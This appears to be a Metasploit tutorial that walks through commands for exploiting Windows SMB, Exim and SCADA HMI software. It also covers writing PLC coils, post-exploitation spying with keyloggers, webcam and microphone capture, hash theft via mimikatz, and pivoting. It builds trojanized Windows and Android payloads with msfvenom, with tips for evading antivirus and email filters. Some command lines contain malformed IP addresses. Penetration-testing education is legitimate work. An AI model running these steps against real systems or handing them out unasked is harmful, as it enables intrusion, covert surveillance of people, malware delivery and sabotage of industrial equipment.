
# Metasploit Framework
<img width="415" alt="Screenshot 2024-01-22 155524" src="https://github.com/deryacortuk/Penetration-Testing-Tutorial/assets/53267226/557e82d9-df15-48f8-b2ae-521555d49911">

Metasploit works by providing the user a number of exploits that can a vulnerability to target and leave behind a payload(shellcode, listener, rootkit) that provide the user access to the target system.

  

**Metasploit Interfaces**

1. msfconsole - an interactive command-line like interface

2. msfcli - a literal Linux command line interface

3. Armitage - a GUI-based third party application

4. msfweb - browser based interface

  

Metasploit has integrated additional tools to make it more than just a exploitation framework. Tools such as nmap, Nessus, and Nexpose, are now integrated into Metasploit so that the entire process from port scanning, vulnerability scanning, exploitation, and post-exploitation, can all be done from one single tool. Metasploit has integrated a postgresql database to store the data collected from your scans and exploits.

  

Metasploit works without postgresql, but this database enables Metasploit to run faster searches and store the information.

  

    kali > systemctl start postgresql

  

    kali > msfdb init

  

    kali > msfconsole

  

If you are more GUI oriented, you can go Applications --> Exploitation Tools --> Metasploit framework.

  

 **Metasploit has 7 types of modules;**
> 
> 1. exploits
> 
> 2. payloads
> 
> 3. auxiliary
> 
> 4. nops
> 
> 5. post
> 
> 6. encoders
> 
> 7. evasion (new in Metasploit5)

  

In Metasploit terminology, an exploit is a module that takes advantage of a system or application vulnerability. It usually will attempt to place a payload on the system. This payload can be a simple command shell or the all-powerful Meterpreter. In other environments, these payloads might be termed listeners or rootkits.

  

    msf6 > search eternalblue

  

    msf6> search platform:windows type:exploit eternalblue
    
      
    
    msf6 > help search

  

author

cve

edb

date

reference

  

İf you were looking for module that addressed CVE-2019-0709 (bluekeep), you could search by entering the following command.

  

    msf5 > search cve:cve-2019-07-09
    
      
    
    msf5 > use 'module name'
    
      
    
    msf5 > use exploit/windows/smb/ms17_010_eternalblue

  

The use command loads the module that we want to deploy in our attack.

  

**The info command**

Once the module is loaded, it is useful to next enter the "info" command. This command displays all the key information about the module, including;

1. key metadata such as name, arch, rank, first disclosed, etc.

2. targets if any

3. the options that need to be set

4. payload information

5. a description of the module

6. references to optain more information about the vulnerability or module

  

**The show command**

It is used to display some key information such as payloads, options, targets, or modules.

  

    msf5 > show payloads
    
      
    
    msf5 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
    
      
    
    msf5 > show options

  

"show options" display is partitioned into 2 sections.; the upper section is the exploit option, and the lower section is the payload options.

  

The format of these sections provides columns that;

1. Name of the variable or option

2. The value in the variable

3. Whether is it required

4. Description

  

    msf5 > set RHOSTS 192.168.1.101
    
    msf5 > set LHOST 192.168.1.102
    
      
    
    msf5 > show options
    
    msf5 > exploit
    
    meterpreter > sysinfo

  

**Metasploit Modules**

We can see the architecture of Metasploit from the command line in our BASH shell.

    kali > cd /usr/share/metasploit-framework
    
      
    
    kali > ls -l
    
      
    
    kali > modules
    
    kali > ls -l
    
    kali > cd exploits
    
    kali > ls -l

**Exploits a flaw or vulnerability in a system**

  

"payloads" are what we leave behind on the exploited system that enables us to connect to "own" the system. In other environments, that might be referred to as listeners or, in some cases, rootkits(rootkits are a special type of payload. Not all payloads are rootkits)

  

    kali > cd ..
    
    kali > payloads
    
    kali > ls -l

  

**The payloads are subdivided into three types;**
1. singles
2. stagers
3. stages

  

"singles" are small self-contained code designed to take some single action, stagers implement a communication channel that is utilized to deliver another payload that can be used to control the target system , and stages are larger payloads that provide control of the target such as the Meterpreter and VNC.

  

**Auxiliary**

Auxilary provides some other capability that does not easily fir into the other catgories. These include such things as scanners, fuzzers, DoS, etc. modules.

  

    kali > cd ..
    
    kali > cd auxiliary
    
    kali > ls -l

Note the analyze, the scanner, and the dos directories. These modules are used to analyze target systems, scan the target system, and DoS the target systems.

  

**Encoders**

The encoders modules are designed to re-encode payloads for varying targets environments such as Android or iOS .

  

    kali > cd ..
    kali > cd encoders
    kali > ls -l

  

**Post**

Post is short for post-exploitation, which are used after exploitation of a system. These modules are often used after the system has been "owned" and has the Meterpreter running on the system. These can include such modules as keyloggers, privilige escalation, enabling the web cam or microphone, etc.

  

    kali > cd ..
    
    kali > cd post
    
    kali > ls -l

  

**NOPS**

In machine language, a NOP is short for "no operation". THis causes the system's CPU to do nothing for a clock cycle. Often, NOP' s are essential for getting a system to run remote code after a buffer overflow exploit. These are often referred to as "NOP sleds". These modules are used primarily to create NOP sleds.

  

    kali > cd ..
    
    kali > cd nops
    
    kali > ls -l

  

**Evasion**

These modules are being developed to help Metasploit payloads evade anti-virus software.

    kali > cd ..
    
    kali > cd evasion
    
    kali > ls -l

  

**Metasploit Scripts**

    kali > cd scripts
    
    kali > ls -l

  

Meterpreter scripts is Metasploit's unique and powerful payload.

    kali > cd meterpreter
    
    kali > ls -l

These scripts are used after successfully owning the target system, such as hashdump.rb to grap the hashes of the password on the system.

  

    kali > cd resource
    
    kali > ls -l

These are resource scripts that come with Metasploit by default. When you create your own resource scripts, they will be stored here.

  

**Writing Our Own Resource Scripts**

Let's create our own simple to start a multi/handler necessary to receive connections.

    kali > msfconsole
    
    msf5 > use exploit/multi/handler
    
    msf5 > set PAYLOAD windows/meterpreter/reverse_http
    
    msf5 > set LHOST 192.168.181.128
    
    msf5 > set LPORT 4444

When we have completed all the commands we want in the scripts, we simply use the keyword "makerc" followed by the name of the script. For instance, I named the script handler_http.rc. ( a multi/handler for HTTP followed by the Metasploit extension for resource files,rc)

  

    msf5 > makerc handler_http.rc

Metasploit saves each of those commands into that script file.

**Check the Scripts Contents**

If checking the script file, we can use one of the many commands in Linux to display the contents of a file such as cat, less, and more.

    msf5 > more handler_http.rc

  

**Executing Our New Script File**

    msf5 > resource handler_http.rc

Metasploit will run each of the commands in our script automatically. Now simply enter "exploit" to start our handler.

    msf5 > exploit

  

**Starting the Script Automatically with Metasploit**

    kali > msfconsole -r handler_http.rc

  

**PAYLOADS**

  

Metasploit enables us to use pre-written exploits against known vulnerabilities in operating systems, browsers, and other applications and place a rootkit/listener/payload on the target system. These payloads are what enable us to connect to the target system and use it as our own after we have exploited a vulnerability in its system.

  

    kali > msfconsole

2384 exploits - 1235 auxiliary - 418 post ]

+ -- --=[ 1391 payloads - 46 encoders - 11 nops ]

+ -- --=[ 9 evasion

There are 1391 payloads in the current version of Metasploit.

  

    msf6 > show payloads

  

**Types of Payloads**

--Inline

These payloads are a single package of exploit and payload. They are inherently more stable but -- because of their size -- they cannot always be used in small, vulnerable memory areas.

    msf6 > search type:payload inline

**Staged**

These payloads essentially are able to fit into very small spaces and create a foothold on the system and then pull rest of the payload.

## Meterpreter

This is the all-powerful payload that we most often want on a target system. It works by .dll injection and resides entirely in memory, leaving no trace of its existence on the hard drive or file system. It has a number of specific commands and scripts developed for it, enabling us to largely work our will on the target system.

**PassiveX**

This payload is for used when firewall rules restrict outbound traffic. In essence, it uses ActiveX through Internet Explorer to hide its outbound traffic and evade the firewall by using HTTP requests and responds just as any browser would.

**NoNX**

In some CPU's, these is a built-in security feature called DEP (Data Execution Prevention). In Windows, it is referred to as No eXecute or NX. The idea behind this security feature is to keep data making its way to the CPU and being executed ( a common technique for exploits). The NoNX payloads are designed to evade this safety feature of modern CPU'S.

**Ord**

These type of payloads work on nearly all Windows operating systems. These are extremely small but somewhat unstable. They are dependent upon loading .dll (dynamic link library) into the exploited process.

**IPv6**

These payloads, as their implies are designed to work on IPV6 networks.

**Reflective DLL injection**

These payload modules are injected directly into the target process while it is running in memory, thereby never writing anything to the hard drive and leaving little or no evidence.

    kali > cd /usr/share/metasploit-framework/modules/payloads
    
    kali > ls -l

**Stages**

Stage payloads use tiny stagers to fit into small exploitation spaces. In other words, if the target's system exploitation buffer or other memory area is very small and only allows a small amount of code to be executed, first a small stager is placed in the memory area. The stager then "pulls" the rest of the payload after this foothold is made on the target system.

These larger staged payloads include such complex payloads as the Meterpreter and VNC injection, both of which include large and complex code. Generally, a staged payload will split the name of the payload between a "/", such as in the payload windows/shell/tcp_bind. The "tcp_bind" is the stager and "shell" is staged.

This convention is not used consistenly in Metasploit, so one often has to go to the "info" section of the payload or find the directory it is into determine if it is a staged payload.

Connecting and Using the postgresql Database with Metasploit

    kali > sudo systemctl start postgresql
    
    kali > systemctl status postgresql
    
    kali > msfdb status
    
    kali > msfdb init ( earlier version)

**Working with Workspaces**

In database terminology, a workspace is simply an area where you store your data within the database. It's a type of virtual database within a database where ypu store your data and objects.

    msf6 > workspace

We can add a new workspace by using the workspace command followed by the option -a and then the name of the new workspace.

    msf6 > workspace -a xlookin

We can switch workspace by simply using the workspace command followed by the name of the workspace.

    msf6 > workspace hackers-arise
    
    msf6 > workspace --- default workspace

To save our results in the database for later use.

    msf6 > db_nmap -A 192.168.0.157

After the db_nmap has completed its work, it saves the IP addresses and info into the connected database. We can view that information with the hosts command.

    msf6 > hosts -h
    
    msf6 > hosts -c address, os_name, purpose
    
    msf6 > services
    
    msf6 > services -c state, info

**Export the Data**

We can export the data in our database to a file. We simply need to use either the hosts or services command, list the columns we want save after the -c (columns) option an then use the -o (output) option followed by the path and file name such as;

    msf6 > hosts -c address, os_name, purpose -o -f /home/kali/hackers-arise-pentest.csv
    
    msf6 > services -o /home/kali/hackers-arise_services.csv

Metasploit uses the open-source database for multiple purposes in its functioning. First, it enables faster and more efficient searches for modules. Second, the pentester/hacker can use it to track the attributes and features of the many target systems to more efficiently test their security posture.

**The Armitage Metasploit User Interface**

After the msfconsole, the Armitage GUI is probably the most popular Metasploit interface.

    kali > sudo apt install armitage
    
    kali > sudo systemctl start postgresql
    
    kali > armitage

**Nmap Port Scanning with Armitage**

Simply go to pull-down menus across the top and hover over "Hosts". This pull down a menu including "Nmap Scan". Armitage provides several choices,inluding "Intense Scan, all TCP ports".

**Adding a new Module**

Once place you might find a few Metasploit modules is www.exploit-db.com. The WebLogic Server(Weblogic is a Java-based middleware used in Oracle database applications that are used around the world by large corparations and financial institutions)

    msf6 > search type:exploit weblogic

click on the "Exploit" icon, and it will promt you to open or save file.

Note that the exploit has a numerical name with a .rb extension as it is a Ruby file. (all modules in Metasploit are Ruby files)

    kali > mv 6666.rb /usr/share/metasploit-framework/modules/exploits/multi/misc/weblogic_deserialization_2020.rb

    msf6 > reload all
    
    msf6 > search type:exploit weblogic
    
    msf6 > use exploit/multi/misc/weblogic_deserialize_2020
    
    msf6 > info

## THe Hacking/Pentesting Process

1. The operating system and version

2. The service pack

3. Install applications

4. Open ports and services

5. Users

Scanning and Vulnerability Assessment in Metasploit

Metasploit enables us to run nmap right from the msf prompt.

    msf6 > nmap -sT 192.168.181.0.1/24 -p1-10000

You can also use the db_nmap command to scan and save the results into Metasploit's postgresql attached database.

    msf6 > db_nmap 192.168.181.0/24

Scanning Modules

    kali > cd /usr/share/metasploit-framework/modules/auxilary
    
    kali > ls -l
    
    kali > cd scanner
    
    kali > ls -l

The SMB protocol has been problematic for over two decades on all operating systems. To determine whether a Windows 7/Server 2008 system is vulnerable to this exploit, there is a scanner in Metasploit to determine as such.

    kali > cd smb
    
    kali > ls -l
    
    msf6 > use auxiliary/scanner/smb/smb_ms17_010
    
    msf6 > set RHOSTS 192.168.1.102
    
    msf6 > run

**Bluekeep Vulnerability**

In May 2019, a security vulnerability was discovered in Microsoft's Remote Desktop Protocol (RDP enables another individual to take control of your system usually to help) This security vulnerability would enable a remote attacker to launch their own code on your system. This vulnerability was designated CVE-2019-0708.

Let's search for the Bluekeep vulnerability scanner. In Metasploit, most vulnerability scanners are kept among the auxilary modules.

    msf6 > search bluekeep
    
    msf6 > use auxilary/scanner/rdp/cve_2019_0708_bluekeep
    
    msf6 > set RHOSTS 192.168.1.101
    
    msf6 > run

To use this module as a denial of service, we need only to change the Available action parameter to Crash.

    msf6 > set ACTION Crash
    
    msf6 > run

## SCADA/ICS Reconnaissance

SCADA or Supervisory Control and Data Acquisition and ICS or Industrial Control System is the most important information security issue of this decade.

    kali > cd /usr/share/metasploit-framework/modules/auxiliary/scanner/scada
    
    kali > ls -l

**Conducting a SCADA scan**

    msf6 > use auxilary/scanner/scada/modbusclient

We need to set the RHOST, the NUMBER of coils to read, and READ_COIL parameters.

    set RHOST
    
    show options
    
    set data_address 1
    
    exploit
    
    set Number 100
    
    exploit

**MS SQL Login Scan**

Among the numerous scans within Metasploit is one that can enumerate logins on Microsoft's flagship database server, SQL Server.

    msf6 > use auxilary/admin/mssql/mssql_enum_sql_logins
    
    msd6 > info

This module can be used to fuzz available SQL Server logins providing us with logins that can then be brute-forced with one of many different password cracking tools.

    msf6 > set RHOSTS 192..
    
    msf6 > exploit

**Importing Your Vulnerability Assessment Scans Into Metasploit**

In many cases, you will likely use one of the many open source or commercial vulnerability scanners such as OpenVas, Nessus, Nexpose, to assess the security posture of your organization. When you do, you import your results directly into your Metasploit database. Using the db_import command these vulnerability assessment results can go directly into your Metasploit seamlessly.

    mfs6 > help db_import
    
      
    
    mfs6 > db_import NessusVulnScan.xml

**Exploiting MS Office File Format Vulnerabilities**

These types of exploits are referred to as "file format" exploits because they exploit a particular vulnerability in a file format, often triggering buffer overflows, thereby enabling remote code execution(RCE). Recent research indicates that approximately 25% of all Microsoft pathces are related to file format vulnerabilities.

    kali > cd /usr/share/metasploit-framework/modules/exploits/windows/fileformat
    
    kali > ls -l
    
    Search for Office Word hta exploit
    
    msf6 > search type:exploit fileformat

**Load the Office Word HTA Exploit**

    msf6 > use exploit/windows/fileformat/office_word_hta
    
    msf6 > info
    
    msf6 > show oppions
    
    msf6 > set FILENAME example.doc
    
    msf6 > set URIPATH example
    
    msf6 > set SRVHOST 192.2.2.2

**Hacking an EXIM Email Server with Metasploit**

The key protocol for email is SMTP running by default on port 25. This protocol handles delivery of email between domains. Either IMAP or POP3 is used by the email client.

The software responsible for moving email between SMTP servers is referred to as the Mail Transfer Unit or MTU. There are numerous MTU's in Linux including, Sendmail, Postfix, and Exim.

    kali > nmap -sT -A 19.2.2.2 -p 25

nmap has identified an exim server on port 25.

If we use the --scripts switch combines with the script category such as "smtp" with the wildcard *, we can activate nmap to try all of the nmap scripts in the smtp category.

    kali > --scripts=smtp-* 193.2.2.2 -p 25

We know the server is exim and the nmap scripts relayed that it may be vulnerability to CVE-2010-4344 and CVE-2010-4345.

    msf6 > search type:exploit exim
    
    msf6 > use exploit/unix/smtp/exim4_string_format
    
    msf6 > info
    
    msf6 > set RHOSTS 192.2.2.2
    
    msf6 > set PAYLOAD cmd/unix/reverse_perl

Note that it is a "reverse" shell. This meaning that it will call back to our system.

    msf6 > set LHOST 182.2.2.2
    
    mfs6 > set LPORT 443
    
    msf6 > exploit

First, let's check to see what user we are. We can execute either id or whoami. Next, let's check to see where we are in the Linux file system (pwd) and the version of the server ( uname -a).

**Web Delivery in Windows**

    msf6 > use exploit/multi/script/web_delivery
    
    msf6 > info
    
    msf6 > set LHOST 192.2.2.2
    
    msf6 > set LPORT 4444

Then we need to set the URIPATH. This sets the URI that the web server will host and the Powershell command will connect back to.

    msf6 > set URIPATH example

By default, the web delivery exploit in Metasploit uses Python scripts. To use the Windows-based Powershell option, we need to set the target to 2.

    msf6 > set target 2

With the target set 2, Metasploit will create a PowerShell script rather than a Python script when we are ready to exploit.

    msf6 > set payload windows/powershell_reverse_tcp
    
    msf6 > show options
    
    msf6 > exploit
    
    msf6 > sessions -l
    
    msf6 > sessions -i 1

Where 1 is the ID of the session.

PS C: \Users > Get-Process

## **IoT Exploitation with Metasploit**

SCADA/ICS system use entirely different protocols from traditional IT system that utilize TCP/IP. These protocols are varied and were usually developed to communicate over serial media (RS485).

Metasploit has ported a number of auxiliary and exploit modules for SCADA/ICS.

**Search for Modbus Modules**

    msf6 > search modbus

Let's load a module with a singular reconnaissance capability called modbusdetect. It is capable of detecting whether a site is running the modbus protocol.

    msf6 > use auxiliary/scanner/scada/modbusdetect

This module only needs the user to set the IP address of the target as RHOST. The default port for modbus is 502, so the RPORT is set to 502 by default.

Modbus allows for up to 254 connected devices. To manipulate or communicate with any modbus device, we must have UNIT ID, not dissimilar to using IP addresses in TCP/IP.

    msf6 > use auxiliary/scanner/scada/modbus_findunitid
    
    msf6 > SET RHOST IP ADDRESS
    
    msf6 > exploit

These UNIT ID's are critical for reading and writing their data.

The next modbus module is modbusclient. It enables us to read and write the data from both the coils and registers on these SCADA systems. Reading the data can lead to information leakage, but writing the data is even more nefarious as it could change the various setting within the plant and cause a malfunction.

    msf6 > use auxiliary/scanner/scada/modbusclient

This module requires several variables to be set. Most important is the ACTION. This variable can be set as;

1. READ_REGISTERS

2. WRITE_REGISTERS

3. READ_COILS

4. WRITE_COILS

Also, note the default setting for the UNIT_NUMBER is 1, and NUMBER is 1. This means that by default, it will take its action only on the first UNIT ID and only the first unit. To increase the number of units the ACTION will act on, simply change the variable NUMBER. In this case, I set the NUMBER variable to 100. This means it will start with UNIT ID number 1 and read 100 registers.

    msf6 > set ACTION WRITE_COIL
    
    msf6 > set DATA 1
    
    msf6 > set ACTION READ_COILS
    
    msf6 > set ACTION WRITE_REGISTERS
    
    msf6 > set DATA 27, 27, 27,27, 27
    
    msf6 > set ACTION READ_REGISTERS

**Download the PLC Ladder Logic**

Within a SCADA/ICS network, PLC'S are the brains behind the actions taking place inside the network. These small computers are programmed to control the devices connected to them. The software program is referred to as "Ladder Logic".

An attacker would likely want to download and analyze the PLC's ladder logic to illuminate what the PLC is controlling and how.

    msf6 > use auxiliary/admin/scada/modicon_stux_transfer
    
    msf6 > show options
    
    msf6 > exploit

When we enter exploit, if the ladder logic is unprotected, it will begin to download the program as we successfully did.

In general, SCADA/ICS hacks have been of two types;

1. Hack the protocols (modbus, DNP3, Profinet,etc)

2. Hack the Human Machine Interface (HMI)

**The Human Machine Interface**

In most SCADA/ICS installations, there is a dedicated system for managing and monitoring the industrial system. Most people in the industry refer to this as the human-machine interface or HMI. This system is crucial to the management of the industrial system but also can be a critical vector for attackers. If the attacker can compromise the HMI , they own your industrial network!

In most installations, the HMI is outside the corparate network. Unfortunately, in some cases, the HMI is inside the corporate network, making it vulnerable to an attacker who compromises the corporate network. (BlackEnergy3 Attack)

Exploit a buffer overflow in the HMI software. Malicious activities;

1. Disabling sensors and alarms

2. Increasing temprature and pressure

3. Altering the mix and concentration of chemşcals

4. Altering the ladder logic

5. Disabling safety controls

**RealWin Server**

RealWin Server is a product of DATAC RealWin.

HMI software is designed to operate in the Telecom, Electricity, Oil/Gas, Marine, and Water industries.

    msf6 > search realwin
    
    msf6 > use exploit/windows/scada/realwin_scpc_initialize
    
    msf6 > info
    
    msf6 > show options
    
    msf6 > exploit
    
    meterpreter > pwd

**Automobile Hacking with Metasploit**

The dominant protocol in automobiles is CAN and that it is a serial protocol.

**Acquire OBD 2 Connector Hardware**

Let's begin by acquiring a device to connector to the automobile's ODC 2 connector. There are several on the market, but Bluetooth ODB 2 mini interface is cheap. It comes with the ELM327 chipset that effectively communicates to the car's CAN network and connecs to your system with Metasploit by Bluetooth, so you will need to have a computer with built-in bluetooth or purchase a Bluetooth USB adapter.

The CAN protocol is a serial protocol, so we will need to install the ruby gem "serialport" in order to "speak" serial.

    kali > gem install serialport

To connect to the ELM327 device, we need its MAC address. We can use the built-in utiliy hcitool to scan for Bluetooth devices and provide us with the MAC address.

    kali > hcitool scan
    
    kali > rfcomm connect /dev/rfcomm1 "00:19:6D:36:4A:9D"

The next step is to run the ELM327 relay that enables Metasploit to communicate with ELM 327 chipset. You can find it by going /usr/share/metasploit-framework/tools/hardware.

    kali > cd /usr/share/metasploit-framework/tools/hardware
    
    kali > ls -l
    
    kali > ruby elm327_relay.rb -h

As you can see, it basically requires just two parameters; the speed(default is 115200) and the serial device (default is /dev/ttyUSB0). To determine which serial to use, check the Linux utility dmesg(display message) and grep for "tty".

    kali > ruby elm327_relay.rb -s /dev/ttyS0
    
    kali > msfconsole
    
    msf6 > search automotive
    
    msf6 > use auxiliary/client/hwbridge/connect
    
    msf6 > info
    
    msf6 > exploit
    
    msf6 > use post/hardware/automotive/getvinfo

**Post Exploitation**

When using Metasploit for post exploitation, we have numerous options. We can view all the post-exploitation modules in Metasploit by using the search command and entering.

    msf6 > search type:post
    
    msf6 > search type:post platform:windows
    
    meterpreter > help
    
    meterpreter > idletime

If we have system administrator privileges on the target -- as we do with the EternalBlue exploit --we can get all the hashes of all the passwords by simply using the hashdump command.

    meterpreter > hashdump
    
    meterpreter > hashdump > hashes
    
    meterpreter > download hashes

In addition, our espionage/intelligence service may want to see what to see what is happening in the room where the computer is located. The meterpreter has a command that will turn on the webcam and a take a single snapshot. It's named webcam_snap. Before we use it, we need to check to see whether a webcam exists on the system and what number has been assigned to it by the operating system. We can use the webcam_list command to do that.

    meterpreter > webcam_list
    
    meterpreter > webcam_list
    
   **Stream the WebCam**
    
    meterpreter > webcam_stream

**Keylogger or How to View Every Keystroke**

To employ our keylogger , we need to decide what process we want to capture keystrokes from and then migrate(move) the meterpreter to that process.

    meterpreter > ps

If we scan down a bit through this list, we can see a process for Wordpad.

The process is running Wordpad, the build-in wordprocessor in Windows. Generally, Wordpad is not open unless the user is writing in it.

    meterpreter > migrate PID
    
    meterpreter > keyscan_start

When we are ready to retrieve the keystrokes, we simply use the keyscab_dump command.

    meterpreter > keyscan_dump

**Using the Target system as a listening "Bug"**

The meterpreter has a built-in command for doing "record_mic"

    meterpreter > record_mic

-d: the number of seconds to record (default=1)

-f: the .wav file

-p: automatically play the capture audio by default true

meterpreter > record_mic -d 10 -f spyaudio.wav -p true

**Mimikatz**

In same cases, the hashdump command will not work to retrieve the password hashes on the local system. In that case, we have another tool that can grap password. Mimikatz is capable of extracting and parsing information from RAM. Among the most important information, we are seeking are the password hashes on the local system. When the system boots up, it loads these hashes into RAM, and with a tool like mimikatz we can extract them.

The first step is to load kiwi. if your target is a 32-bit system you will load mimkatz.

    meterpreter > load kiwi

    meterpreter > mimikatz_command -f samdump::hashes

**Scanning the Internal Network**

To find out what other systems are on the network, the meterpreter has a post-explotation command arpscanner. Address Resolution Protocol is used to map MAC addresses to IP addresses on the LAN. This tool emulates this process to get system on the network to give up their IP and MAC address.

    meterpreter > run arp_scanner -r 192.2.2.2/24
    
    meterpreter > shell

c:\Windows\system32> mysql -u root -p

    mysql > show databases;
    
    mysql > quit

  

Now from the command we can invoke the mysqldump command that is used to create database backups and direct its output to our remote system.

mysqldump -u root -p -h 19.2.2. movie-db > backup.sql

  

**Pivoting to Control the Network**

    meterpreter> ipconfig

**Scan the Network for other Systems**

The meterpreter has an ARP scanner built-in. We can scan the entire network for additional systems by using the command arp_scanner, the -r switch followed by the network using CIDR notation.

CIDR -- Classless Inter Domain Routing

  

    meterpreter > run arp_scanner -r 182.2.2.0/24
    
      
    
    meterpreter> background
    
    msf6> route add 192.2.2.2 255.255.255.0 1
    
    msf6> route print

  

**Port Scan**

Scan them with the post auxiliary module auxiliary/scanner/portscan/tcp

    msf6> use axiliary/scanner/portscan/tcp
    
    msf6> set RHOSTS 192.2.2.2
    
    msf6 > set PORTS 1-2000
    
    msf> run

Pivoting enables us to compromise a single user's system on a network and then leverage that to compromising every machine on the network. From the route we had added to the compromised system, we can launch attacks against nearly anything other machine on the internal network from our Metasploit console.

**Creating Custom Payloads with msfvenom**

We may want to embed a payload/listener into a game, an application or other malicious software that we hope the target clicks and we can take control of their computer. This is exacly what msfvenom is designed for.

    msf6 > msfvenom -h

Encoders are the various algorithms and encoding schemes that Metasploit can use to re-encode the payloads. In this way, we can obfuscate the intent of the payload. Metasploit has numerous encoding schemes.

    msf6 > msfvenom -l encoders

"shikata_ga_nai" is excellent. "Shikataganai" is a phrase from Japanese culture that loosely translates as "nothing can be done about it" .

In msfvenom terminology, a platform is loosely an operating system or scripting language with a few exceptions, such as netware. When building our custom payloads, we must build it specifically for the target operating system.

    msf6> msfvenom -l platforms

Note that nearly every operating system is represented here, from AIX to Android to Linux to OSX to Windows and nearly everything else in between. When building our custom payload, we must select the proper target platform to be successful.

When we build our custom payload, we can use the --platform <targetplatform> syntax to designate our target platform.

    msf6> msfvenom -l formats
    
    msf6> msfvenom -p <payload name> --payload-options
    
    msf6> msfvenom -p windows/meterpreter/reverse_tcp --payload-options
    
    msf6> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR LOCAL IP> LPORT=<whatever port you want to listen on> -k -x /usr/share/chess.exe -e x86/shikata_ga_nai -i 200 -f exe > bestdigitalchess.exe

-k is keep the function of the template file

-x designates the template

-e x86/shikata_ga_nai designates the encoder we want to use

-i 200 represent the number iterations

-f exe designates we want to create an executable

msfvenom defaults to x86, of course, if we want to create an x64 payload, we will need to add "-a x64" to our command.

    msf6> use exploit/multi/handler
    
    msf6> set payload windows/meterpreter/reverse_tcp
    
    meterpreter> sysinfo

**Gainin Control Over a System with Physical Access**

Build an executable with msfvenom

    msf6> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f exe >malware

Next, copy the malware.exe file to a flash drive.

    msf6> use multi/handler
    
    msf6> set payload windows/meterpreter/reverse_tcp
    
    msf6> set LHOST 192.11.1.1
    
    msf6> set LPORT 4444
    
    msf6> exploit
    
    meterpreter> ps
    
    meterpreter> webcam_list
    
    meterpreter> webcam_snap
    
    Exploting Android Devices
    
    msf6>search type:exploit platform:android
    
      
    
    msf6> search type:platform platform:android

.apk (Android PacKage File)

  

msfvenom create custom payloads.

  

    msf6> msfvenom -p android/meterpreter/reverse_tcp LHOST=192.3.3.3 LPORT=6996 R >AndroidMalware.apk

  

We set up an .rc script to automatically start and open a listener to accept outside connections to our Metasploit.

    msf6> resource handler_http.rc

if you don't have a listener script, you can start a listener by entering the following commands;

    msf6> use exploit/multi/handler
    
    msf6>set PAYLOAD android/meterpreter/reverse_tcp
    
    msf6> set LHOST 192.1.1.1
    
    msf6> set LPORT 6996
    
    msf6> exploit

You will need to send AndroidMalware.apk file to the target via email or DropBox or other means. It's important to note that this file will likely be flagged by Gmail and other email services as malware. As a result, consider re-encoding the payload with OWASP-ZSC or other obfuscation software such as shellter or Veil-Evasion.

  

    meterpreter> sysinfo
    
    meterpreter> help

  

**Gathering data from the Android device**

    meterpreter> dump_sms
    
    meterpreter> dump_contacts
    
    meterpreter> webcam_list
    
    meterpreter> webcam_snap 1

  

**The New Evasion Modules**

    msf6> show evasion

    kali> mousepad /usr/share/metasploit-framework/modules/evasion/windows/windows_defender_exe
    
      
    
    msf6> search type:evasion
    
    msf6> use evasion/windows/windows_defender_exe
    
    msf6> info
    
    msf6> set FILENAME example
    
    msf6> set PAYLOAD windows/meterpreter/reverse_https
    
      
    
    msf6> set LHOST 192.2.2.2
    
    msf6> show options
    
    mfs6> exploit
    
    msf6> use exploit/multi/handler
    
    msf6> set LHOST 192.2.2.2
    
    msf6> set LPORT 8443

  

**AutoSploit**

  

AutoSploit combines the power of two tools, Shodan and Metasploit. AutoSploit uses Shodan to find specific targets based upon their banners and then Metasploit to automate the use of powerful exploits.

  

    kali> git clone https://github.com/NullArray/AutoSploit
    
    kali> pip install shodan
    
    kali> pip install blessings
    
    kali> python autosploit.py

  

You will then be asked whether you want to use the default modules or the default fuzzers (2). select default modules or "2"

  

**Metasploit for Remote Windows Forensics**

    kali> cd /usr/share/metasploit-framework/modules/post/windows/gather/forensics
    
    kali> ls -l
    
    meterpreter> background
    
    msf6>use post/windows/gather/forensics/enum_drives
    
      
    
    msf6> set SESSION 1
    
    msf6> exploit
    
    msf6> use post/windows/gather/forensics/recovery_files
    
      
    
    msf6> show options
    
    mfs6> set TIMEOUT 7200
    
    msf6> exploit

To recover this deleted file, we must set the FILES parameter to that file number and exploit it again

    msf6> set FILES 23838383883
    
    msf6> exploit

You can get the Windows version of netcat and windows version of dd. (dd is the bit-by-bit disk copying utility.)

    meterpreter> upload nc.exe
    
    meterpreter> upload dd
    
    kali> nc -l 6996 | bzip2 -d | dd bs=16M of=/dev/forensicimage // -d decompress
    
    meterpreter> shell

  

Forensic suite such as Autopsy, FTK, Encase 

  

**Updating the msfconsole** 

The old way

    kali> msfupdate

APT Package Manager Update

    kali> apt update; apt install metasploit-framework




